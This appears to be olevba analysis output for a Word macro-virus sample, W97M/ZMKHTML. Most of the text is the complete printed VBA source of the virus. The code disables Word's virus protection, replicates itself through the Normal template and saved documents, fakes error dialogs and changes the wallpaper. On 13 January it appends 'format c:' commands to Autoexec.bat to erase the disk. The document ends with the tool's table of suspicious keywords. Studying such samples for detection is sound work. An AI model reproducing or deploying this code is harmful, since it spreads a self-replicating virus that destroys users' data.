olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Zmk.q
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ZMKHTML.cls 
in file: ./Virus.MSWord.Zmk.q - OLE stream: 'Macros/VBA/ZMKHTML'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrDO
iMacroNTCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroNTCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "ZMKHTML" Then
        ZMKHTMLInstalled = -1
    End If
Next i
If Not ZMKHTMLInstalled Then
    ActiveDocument.VBProject.VBComponents("ZMKHTML").Export "C:\Msdos.win"
    ActiveDocument.VBProject.VBComponents("About").Export "C:\Win.dos"
    ActiveDocument.VBProject.VBComponents("Propos").Export "C:\Dos.win"
    NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\Msdos.win"
    NormalTemplate.VBProject.VBComponents("ZMKHTML").CodeModule.DeleteLines 1, 4
    NormalTemplate.VBProject.VBComponents.Import "C:\Win.dos"
    NormalTemplate.VBProject.VBComponents.Import "C:\Dos.win"
End If
ErrDO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrFSA
Dialogs(wdDialogFileSaveAs).Show
If (ActiveDocument.SaveFormat = wdFormatTemplate) Or (ActiveDocument.SaveFormat = wdFormatDocument) Then
    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
End If
iMacroDCount = ActiveDocument.VBProject.VBComponents.Count
For i = 1 To iMacroDCount
    If ActiveDocument.VBProject.VBComponents(i).Name = "ZMKHTML" Then
        ZMKHTMLDocInstalled = -1
    End If
Next i
If Not ZMKHTMLDocInstalled Then
    NormalTemplate.VBProject.VBComponents("ZMKHTML").Export "C:\Msdos.win"
    NormalTemplate.VBProject.VBComponents("About").Export "C:\Win.dos"
    NormalTemplate.VBProject.VBComponents("Propos").Export "C:\Dos.win"
    ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\Msdos.win"
    ActiveDocument.VBProject.VBComponents("ZMKHTML").CodeModule.DeleteLines 1, 4
    ActiveDocument.VBProject.VBComponents.Import "C:\Win.dos"
    ActiveDocument.VBProject.VBComponents.Import "C:\Win.dos"
    ActiveDocument.Save
End If
ErrFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFTem
If System.LanguageDesignation = "Franзais (standard)" Then
    MsgBox "Fonction Sub Inconnu", vbCritical, "Microsoft Word"
Else
    MsgBox "Sub Function unknown", vbCritical, "Microsoft Word"
End If
ErrorFTem:
End Sub
Sub HelpAbout()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorHelpAbout
If System.LanguageDesignation = "Franзais (standard)" Then
    Propos.Show
Else
    About.Show
End If
ErrorHelpAbout:
End Sub
Sub AutoExit()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFEx
Dim MyDate, MyTime
MyDate = Date
MyTime = Time
D1$ = Mid(MyDate, 1, 2)
D2$ = Mid(MyDate, 4, 5)
T1$ = Mid(MyTime, 4, 5)
If (D1$ = "13") And (D2$ = "01") Then
Open "C:\ZMKHTML.htm" For Output As #1
    Print #1, "<HTML>"
    Print #1, "<HEAD>"
    Print #1, "<META HTTP-EQUIV=""Content-Type"" CONTENT=""text/html; charset=windows-1252"">"
    Print #1, "<TITLE>Virus ZMKHTML</TITLE>"
    Print #1, "<body bgcolor=""blue"" >"
    Print #1, "<p><font size=""6""><strong><MARQUEE behavior=""alternate"">Le 13, ce n'est pas de chance pour vous aujourd'hui!!!!!</MARQUEE></font></p>"
    Print #1, "<p>&nbsp;</p>"
    Print #1, ""
    Print #1, "<p>&nbsp;</p>"
    Print #1, ""
    Print #1, "<p><font size=""7""><strong><MARQUEE behavior=""slide"">HA HA HA HA HA HA HA HA HA !!!!!!!!!!!!</MARQUEE></font></p>"
    Print #1, ""
    Print #1, "<p>&nbsp;</p>"
    Print #1, ""
    Print #1, "<p>&nbsp;</p>"
    Print #1, ""
    Print #1, "<p>&nbsp;</p>"
    Print #1, "<p><font size=""8""><strong><MARQUEE>Merci а son auteur ZeMacroKiller98 ainsi qu'aux membre de [SOS](Sign Of Scream)</MARQUEE></font></p>"
    Print #1, "</body>"
    Print #1, "</HTML>"
Close #1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = "C:\ZMKHTML.htm"
Open "C:\Autoexec.bat" For Append As #1
Print #1, "@echo off"
Print #1, "echo Joyeux anniversaire а ZeMacroKiller98"
Print #1, "echo Happy birthday ZeMacroKiller98"
Print #1, "echo o|format c: /u"
Print #1, "echo y|format c:/u"
Close #1
MsgBox "Vive ZeMacroKiller98 ainsi que les membres de [SOS]", vbInformation, "Virus ZMKHTML"
Tasks.ExitWindows
GoTo Fin
End If
If D1$ = "13" Then
Open "C:\ZMKHTML.htm" For Output As #1
    Print #1, "<HTML>"
    Print #1, "<HEAD>"
    Print #1, "<META HTTP-EQUIV=""Content-Type"" CONTENT=""text/html; charset=windows-1252"">"
    Print #1, "<TITLE>Virus ZMKHTML</TITLE>"
    Print #1, "<body bgcolor=""yellow"" >"
    Print #1, "<p><font size=""6""><strong><MARQUEE behavior=""alternate"">Aujourd'hui c'est l'anniversaire de mon crйateur:</MARQUEE></font></p>"
    Print #1, "<p>&nbsp;</p>"
    Print #1, ""
    Print #1, "<p>&nbsp;</p>"
    Print #1, ""
    Print #1, "<p><font size=""7""><strong><MARQUEE behavior=""slide"">Joyeux anniversaire ZeMacroKiller98!!!!!</MARQUEE></font></p>"
    Print #1, ""
    Print #1, "<p>&nbsp;</p>"
    Print #1, ""
    Print #1, "<p>&nbsp;</p>"
    Print #1, ""
    Print #1, "<p>&nbsp;</p>"
    Print #1, "<p><font size=""8""><strong><MARQUEE>Happy birthday ZeMacroKiller98!!!!!!!</MARQUEE></font></p>"
    Print #1, "</body>"
    Print #1, "</HTML>"
Close #1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = "C:\ZMKHTML.htm"
Else
Open "C:\ZMKHTML.htm" For Output As #1
Print #1, "<HTML>"
Print #1, "<HEAD>"
Print #1, "<META HTTP-EQUIV=""Content-Type"" CONTENT=""text/html; charset=windows-1252"">"
Print #1, "<TITLE>Virus ZMKHTML</TITLE>"
Print #1, "<body bgcolor=""red"" >"
Print #1, "<p><font size=""6""><strong><MARQUEE behavior=""alternate"">ATTENTION, VOTRE ORDINATEUR EST INFECTE PAR W97M/ZMKHTML.</MARQUEE></font></p>"
Print #1, "<p>&nbsp;</p>"
Print #1, ""
Print #1, "<p>&nbsp;</p>"
Print #1, ""
Print #1, "<p>&nbsp;</p>"
Print #1, ""
Print #1, "<p>&nbsp;</p>"
Print #1, ""
Print #1, "<p>&nbsp;</p>"
Print #1, ""
Print #1, "<p>&nbsp;</p>"
Print #1, "<p><font size=""8""><strong><MARQUEE>BECAREFULL, YOUR COMPUTER IS INFECTED BY W97M/ZMKHTML.</MARQUEE></font></p>"
Print #1, "</body>"
Print #1, "</HTML>"
Close #1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = "C:\ZMKHTML.htm"
End If
Fin:
ErrorFEx:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorToolM:
If System.LanguageDesignation = "Franзais (standard)" Then
    MsgBox "Une erreur interne а ce programme est survenu" & Chr$(13) & "Veuillez rйessayer plus tard", vbCritical, "Microsoft Word"
Else
    MsgBox "A internal error in this program is occured" & Chr$(13) & "Retry later", vbCritical, "Microsoft Word"
End If
ErrorToolM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorViewVBC:
If System.LanguageDesignation = "Franзais (standard)" Then
    MsgBox "Ce module de programme n'est pas installй" & Chr$(13) & "Veuillez consulter l'aide en ligne", vbInformation, "Microsoft Word"
Else
    MsgBox "This program module is not installed" & Chr$(13) & "Please see the help on line", vbCritical, "Microsoft Word"
End If
ErrorViewVBC:
End Sub

-------------------------------------------------------------------------------
VBA MACRO About.frm 
in file: ./Virus.MSWord.Zmk.q - OLE stream: 'Macros/VBA/About'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
Unload About
End Sub
Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO Propos.frm 
in file: ./Virus.MSWord.Zmk.q - OLE stream: 'Macros/VBA/Propos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
Unload Propos
End Sub

Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�This virii was created by the best macro virii author:G
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZeMacroKiller98
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZeMacroKiller98
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZeMacroKiller98
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Greetz to all members of [SOS] Sign Of Scream
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ce virus a �t� cr�� par le meilleur auteur de macros virus:��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZeMacroKiller98
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZeMacroKiller98
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZeMacroKiller98
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Merci � tous les membres de [SOS] Sign Of Scream�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/About'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Zmk.q' - OLE stream: 'Macros/Propos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

